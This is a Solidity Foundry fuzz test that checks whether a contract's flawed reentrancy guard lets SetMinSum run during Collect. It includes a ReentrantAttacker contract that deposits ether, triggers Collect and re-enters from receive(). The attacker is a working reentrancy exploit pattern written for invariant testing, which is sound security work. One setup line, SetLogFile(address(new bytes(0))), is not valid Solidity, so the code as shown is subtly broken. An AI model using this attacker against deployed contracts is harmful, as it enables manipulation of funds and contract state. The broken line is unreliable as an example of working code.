contract InvMutTest is Test {
    C c;
    function setUp() public { c = new C(); }

    function testFuzz_property(uint256 _am, uint256 _newMin) public {
        // Keep amounts in admissible range, non-zero value for the Collect attempt
        _am = bound(_am, 1, type(uint128).max);
        _newMin = bound(_newMin, 0, type(uint128).max);

        // Deploy reentrant attacker that calls SetMinSum on Collect callback
        ReentrantAttacker attacker = new ReentrantAttacker(address(c), _newMin);

        // Setup: initialize the contract
        c.SetMinSum(0);
        c.SetLogFile(address(new bytes(0)));
        c.Initialized();

        // Give attacker some ether to satisfy balance checks within Collect
        vm.deal(address(attacker), _am);

        // Record MinSum before operation
        uint256 minSumBefore = c.MinSum();

        // Driver: attacker calls Put then Collect, which triggers reentrancy
        attacker.initiate(_am);

        // After the call returns, MinSum must equal its prior value because Collect
        // should never change MinSum. The buggy nonReentrant_ allows SetMinSum
        // to execute during Collect, breaking this invariant.
        assertTrue(c.MinSum() == minSumBefore);
    }
}

contract ReentrantAttacker {
    C target;
    uint256 newMin;
    bool private attacking;

    constructor(address _target, uint256 _newMin) {
        target = C(_target);
        newMin = _newMin;
    }

    function initiate(uint256 _am) external payable {
        // Deposit ether so that balance requirements are met
        target.Put{value: _am}(0);
        attacking = true;
        // Trigger Collect; on low-level call returning to us, receive() will re-enter
        target.Collect(_am);
        attacking = false;
    }

    receive() external payable {
        if (attacking) {
            // Reentrant call: SetMinSum changes MinSum mid-Collect
            target.SetMinSum(newMin);
        }
    }
}

